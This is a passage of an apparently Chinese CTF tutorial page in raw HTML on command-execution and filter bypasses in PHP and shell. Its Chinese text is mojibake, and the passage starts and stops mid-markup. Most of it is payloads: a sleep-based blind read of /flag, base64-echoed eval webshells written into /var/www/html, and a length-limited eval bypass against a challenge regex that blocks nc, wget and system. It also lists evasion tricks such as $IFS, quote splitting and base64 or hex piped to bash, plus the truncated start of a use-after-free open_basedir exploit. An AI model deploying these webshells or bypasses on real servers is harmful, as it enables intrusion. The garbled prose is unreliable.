class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);<span class="keyword">if</span> [ <span class="variable">$a</span> = &#123;j&#125; ];<span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸€éƒ¨åˆ†</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=$(<span class="built_in">cat</span> /flag | <span class="built_in">head</span> -1 | <span class="built_in">cut</span> -b &#123;i&#125;);</span><br><span class="line">å®šä¹‰å˜é‡aï¼Œå°†<span class="built_in">cat</span> /flagçš„ç»“æœåˆ©ç”¨<span class="built_in">head</span> -1å–ç¬¬ä¸€è¡Œï¼Œåˆ©ç”¨<span class="built_in">cut</span> -b numberå–ç»“æœçš„ç¬¬iï¼ˆè„šæœ¬ä¸­çš„å¾ªç¯iï¼‰ä¸ªå­—ç¬¦ï¼Œå°†å­—ç¬¦èµ‹å€¼ç»™a</span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒéƒ¨åˆ†</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if <span class="selector-attr">[ $a = &#123;j&#125; ]</span>;</span><br><span class="line">åˆ¤æ–­å¾—åˆ°çš„å˜é‡<span class="selector-tag">a</span>æ˜¯å¦ç­‰äºjï¼Œjä¸ºä¸Šè¿°è„šæœ¬ä¸­dicå­—å…¸çš„éå†ç»“æœ</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰éƒ¨åˆ†</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">then</span> <span class="built_in">sleep</span> 2;<span class="keyword">fi</span></span><br><span class="line">å¦‚æœåˆ¤æ–­ä¸ºçœŸï¼Œåˆ™ç¡çœ 2ç§’ï¼Œé€šè¿‡ç½‘é¡µæ˜¯å¦ç¡çœ åˆ¤æ–­å‡ºflagçš„æ¯ä¸ªå­—æ¯çš„ç»“æœ</span><br></pre></td></tr></table></figure><h5 id="å‘½ä»¤è¡Œå†™shell">å‘½ä»¤è¡Œå†™shell</h5><p>å¯ä»¥é€šè¿‡å‘½ä»¤æ‰§è¡Œå†™å…¥shellï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œåœ¨æŸäº›æƒ…å†µä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=&#x27; | base64 -d &gt; ./123.php  </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">//base64è§£ç ç»“æœä¸º</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/2.php</span></span><br></pre></td></tr></table></figure><h4 id="é•¿åº¦é™åˆ¶ç»•è¿‡">é•¿åº¦é™åˆ¶ç»•è¿‡</h4><p>ç¤ºä¾‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æ­¤é¢˜åˆ©ç”¨substrå‡½æ•°å¯¹evalçš„ä»£ç è¿›è¡Œäº†é™åˆ¶</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getä¼ å‚   F=<span class="string">`$F `</span>; <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">ç»è¿‡<span class="keyword">substr</span>($F,<span class="number">0</span>,<span class="number">6</span>)æˆªå–å å¾—åˆ°  <span class="string">`$F `</span>;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ <span class="keyword">eval</span>(<span class="string">&quot;`$F `;&quot;</span>);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„$Få¸¦è¿›å»</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``$F `;sleep 3`&quot;</span>);</span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆä¼šæ‰§è¡Œ  <span class="string">` `</span>$F <span class="string">`;sleep 3 `</span> == shell_exec(<span class="string">&quot;`$F `; sleep 3&quot;</span>);</span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br><span class="line">è¿™æ ·å°±åœ¨æœåŠ¡å™¨ä¸ŠæˆåŠŸæ‰§è¡Œäº† <span class="keyword">sleep</span> <span class="number">3</span></span><br><span class="line">æ‰€ä»¥ æœ€åå°±æ˜¯ä¸€é“æ— å›æ˜¾çš„RCEé¢˜ç›®äº†ï¼Œå°†<span class="keyword">sleep</span> <span class="number">3</span>æ¢æˆæˆ‘ä»¬<span class="number">2.1</span>.<span class="number">1</span>èŠ‚ä¸­æ‰€è®²çš„æ“ä½œå³å¯å¾—åˆ°ç­”æ¡ˆ</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤ç»•è¿‡">å‘½ä»¤ç»•è¿‡</h4><h5 id="ç©ºæ ¼">ç©ºæ ¼</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$IFS</span>              </span><br><span class="line"></span><br><span class="line">&#123;<span class="built_in">cat</span>,flag.php&#125;                        <span class="literal">--</span>è¿™é‡ŒæŠŠï¼Œæ›¿æ¢æˆäº†ç©ºæ ¼é”®</span><br><span class="line"></span><br><span class="line">%<span class="number">20</span>                                   <span class="literal">--</span>ä»£è¡¨spaceé”®</span><br><span class="line"></span><br><span class="line">\x20  <span class="literal">--</span>ä»£è¡¨spaceé”®ï¼Œevalç±»ä¸­å¯ç”¨</span><br><span class="line"></span><br><span class="line">%<span class="number">09</span>           <span class="literal">--</span>éœ€è¦phpç¯å¢ƒï¼Œå¦‚<span class="built_in">cat</span>%<span class="number">09</span>flag.php</span><br><span class="line"></span><br><span class="line">\x09  <span class="literal">--</span>ä»£è¡¨spaceé”®ï¼Œevalç±»ä¸­å¯ç”¨</span><br><span class="line"></span><br><span class="line"><span class="variable">$</span>&#123;IFS&#125;  <span class="literal">--</span>å•çº¯<span class="built_in">cat</span><span class="variable">$IFS2</span>,IFS2è¢«bashè§£é‡Šå™¨å½“åšå˜é‡åï¼Œè¾“ä¸å‡ºæ¥ç»“æœï¼ŒåŠ ä¸€ä¸ª&#123;&#125;å°±å›ºå®šäº†å˜é‡åï¼Œå¦‚<span class="built_in">cat</span><span class="variable">$</span>&#123;IFS&#125;flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span>  <span class="literal">--</span>åé¢åŠ ä¸ª<span class="variable">$</span>ä¸&#123;&#125;ç±»ä¼¼ï¼Œèµ·æˆªæ–­ä½œç”¨ï¼Œ<span class="variable">$9</span>æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå¦‚<span class="built_in">cat</span><span class="variable">$IFS</span><span class="variable">$9flag</span>.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;    <span class="literal">--</span>é‡å®šå‘ï¼Œå¦‚<span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"></span><br><span class="line">&lt;&gt;       <span class="literal">--</span>é‡å®šå‘ï¼Œå¦‚<span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure><h5 id="å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡">å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span><span class="operator">=</span>l<span class="comment">;b=s;c=/;$a$b $c</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰å˜é‡aä¸ºlï¼Œbä¸ºsï¼Œcä¸º/ï¼Œæ‰§è¡Œå‘½ä»¤$a$b $cå³ls /</p><h5 id="base64ç¼–ç ç»•è¿‡">base64ç¼–ç ç»•è¿‡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> MTIzCg==|<span class="built_in">base64</span> -d å…¶å°†ä¼šæ‰“å°123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | bash </span><br><span class="line">`<span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d`                   ==&gt;ä¸‰ç§ç»“æœçš†ä¸º<span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">echo</span> bHMgLw== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure><h5 id="16è¿›åˆ¶ç¼–ç ç»•è¿‡">16è¿›åˆ¶ç¼–ç ç»•è¿‡</h5><p>ç”Ÿæˆè„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//6c73202f</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">6</span>c73202f | <span class="type">xxd</span> -r -p | <span class="type">bash</span></span><br><span class="line">`echo <span class="number">6</span>c73 | <span class="type">xxd</span> -r -p`</span><br><span class="line">echo `<span class="number">6</span>c73202f` | <span class="type">xxd</span> -r -p | <span class="type">sh</span> &gt; <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><h5 id="å•åŒå¼•å·ç»•è¿‡">å•åŒå¼•å·ç»•è¿‡</h5><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t <span class="built_in">flag</span> </span><br><span class="line">ca<span class="string">&quot;&quot;</span>t <span class="built_in">flag</span></span><br><span class="line">l<span class="string">&#x27;&#x27;</span>s /</span><br><span class="line">l<span class="string">&quot;&quot;</span>s /</span><br></pre></td></tr></table></figure><h5 id="åæ–œæ ç»•è¿‡">åæ–œæ ç»•è¿‡</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l<span class="string">\s</span> /</span><br><span class="line">l<span class="string">\s</span> /<span class="keyword">var</span>/www/ht<span class="string">\ml</span></span><br><span class="line">ca<span class="string">\t</span> f<span class="string">\ag</span></span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡ipä¸­çš„å¥ç‚¹">ç»•è¿‡ipä¸­çš„å¥ç‚¹</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ç»œåœ°å€å¯ä»¥è½¬æ¢æˆæ•°å­—åœ°å€ï¼Œæ¯”å¦‚<span class="number">127.0</span>.<span class="number">0.1</span>å¯ä»¥è½¬åŒ–ä¸º<span class="number">2130706433</span>ã€‚</span><br><span class="line">å¯ä»¥ç›´æ¥è®¿é—®http:<span class="regexp">//</span><span class="number">2130706433</span>æˆ–è€…http:<span class="regexp">//</span><span class="number">0</span>x7F000001ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡.çš„ipè¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">æ•°å­—è½¬ipåœ°å€</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">ipåœ°å€è½¬æ•°å­—</a></p><p><a href="http://www.msxindl.com/tools/ip/ip_num.asp">åŸŸåè½¬æ•°å­—ip</a></p><h5 id="æ­£åˆ™åŒ¹é…ç»•è¿‡">æ­£åˆ™åŒ¹é…ç»•è¿‡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag  =&gt;   <span class="built_in">cat</span> [e-g]lag</span><br><span class="line">   <span class="built_in">cat</span> f&#123;k..m&#125;ag</span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ­£åˆ™åŒ¹é…ç¨æœ‰ä¸åŒï¼š</p><p>1.[]ä¸ºå¼€åŒºé—´ï¼Œå¹¶<strong>ä¸åŒ…å«</strong>å·¦å³è¾¹ç•Œ</p><p>2.{}ä¸ºé—­åŒºé—´ï¼Œ<strong>åŒ…å«</strong>å·¦å³è¾¹ç•Œ</p><p>æ‰€ä»¥å¯å¾—ï¼Œå‰è€…åªä¼šåŒ¹é…fï¼Œè€Œåè€…ä¼šåŒ¹é…k,l,m</p><h5 id="å†…æ•›æ‰§è¡Œæ³•ç»•è¿‡">å†…æ•›æ‰§è¡Œæ³•ç»•è¿‡</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> `<span class="built_in">ls</span>`</span><br><span class="line">//è·å–<span class="built_in">ls</span>ä¸‹çš„æ‰€æœ‰çš„æ–‡ä»¶å†…å®¹</span><br></pre></td></tr></table></figure><h5 id="é»‘æ´ç»•è¿‡">é»‘æ´ç»•è¿‡</h5><p><strong>é»‘æ´ï¼š</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="regexp">/dev/</span><span class="keyword">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">&gt;ä»£è¡¨é‡å®šå‘ï¼Œä¼šå°†æˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„æ‰€æœ‰ç»“æœå…¨éƒ¨ä¸¢è¿›é¢„å®šä¹‰çš„<span class="regexp">/dev/</span><span class="keyword">null</span>è¿™ä¸€åƒåœ¾æ¡¶ä¸­ï¼Œå¯¼è‡´æˆ‘ä»¬æ”¶ä¸åˆ°å›æ˜¾</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç®¡é“ç¬¦ç»•è¿‡,æ•ˆæœè¯¦è§1.1èŠ‚</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls || &gt;<span class="regexp">/dev/</span><span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡open-basedir">ç»•è¿‡open_basedir()</h5><p><strong>1.ini_seté‡è®¾ç½®ç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è®¾ç½® open_basedir</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/path/to/allowed/directory:/another/allowed/directory&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥è®¾ç½®å¤šä¸ªå®‰å…¨ç›®å½•ï¼Œç›®å½•å’Œç›®å½•ä¹‹é—´å¯ä»¥ä½¿ç”¨:è¿›è¡Œåˆ†éš”</p><p><strong>2.UAFè„šæœ¬ç»•è¿‡å®‰å…¨ç›®å½•</strong></p><p>ä½¿ç”¨æ—¶éœ€è¦è¿›è¡Œurlç¼–ç å†ä¼ å…¥ï¼ˆbpç¼–ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span 